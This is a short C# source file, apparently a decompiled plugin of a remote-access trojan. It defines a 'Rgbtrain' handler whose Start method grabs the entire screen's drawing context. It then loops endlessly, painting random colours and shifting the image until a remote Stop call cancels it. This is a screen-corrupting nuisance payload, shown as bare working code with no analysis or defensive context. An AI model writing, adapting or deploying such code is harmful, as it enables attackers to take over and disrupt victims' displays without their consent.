using System;
using System.Threading;
using System.Windows.Forms;
using Plugin.Helper.GDI;

namespace Plugin.Handler.GDI;

internal class HandleRgbtrain
{
	public static CancellationTokenSource ctsStop;

	public static void Start()
	{
		if (ctsStop == null || ctsStop.IsCancellationRequested)
		{
			ctsStop = new CancellationTokenSource();
			Random random = new Random();
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			while (!ctsStop.IsCancellationRequested)
			{
				IntPtr dC = NativeMethods.GetDC(IntPtr.Zero);
				IntPtr hObject = NativeMethods.CreateSolidBrush(NativeMethods.RGB((byte)random.Next(256), (byte)random.Next(256), (byte)random.Next(256)));
				NativeMethods.SelectObject(dC, hObject);
				NativeMethods.BitBlt(dC, 0, 0, width, height, dC, -30, 0, 107385454862L);
				NativeMethods.BitBlt(dC, 0, 0, width, height, dC, width - 30, 0, 107385454862L);
				NativeMethods.DeleteObject(hObject);
				NativeMethods.ReleaseDC(IntPtr.Zero, dC);
			}
		}
	}

	public static void Stop()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			ctsStop.Cancel();
		}
	}
}
